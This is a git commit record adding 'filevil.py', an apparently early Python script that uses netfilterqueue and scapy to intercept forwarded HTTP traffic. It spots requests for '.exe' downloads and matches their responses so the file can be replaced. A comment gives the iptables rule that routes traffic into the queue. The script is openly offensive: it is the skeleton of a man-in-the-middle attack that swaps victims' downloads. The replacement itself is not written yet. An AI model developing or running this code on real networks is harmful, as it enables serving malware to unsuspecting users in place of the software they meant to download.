d9a605594326bab7db52705429a6ffba3ce7e9f7
p37 <gh0stsync.rt@gmail.com>
2018-07-25 08:41:12 -0700

    initial project version

---
+++ filevil.py
@@ -0,0 +1,30 @@
+#!/urs/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print "[+] exe Request"
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print scapy_packet.show()
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print "[+] Replacing file"
+                print scapy_packet.show()
+
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+#iptables -I FORWARD -j NFQUEUE --queue-num 0
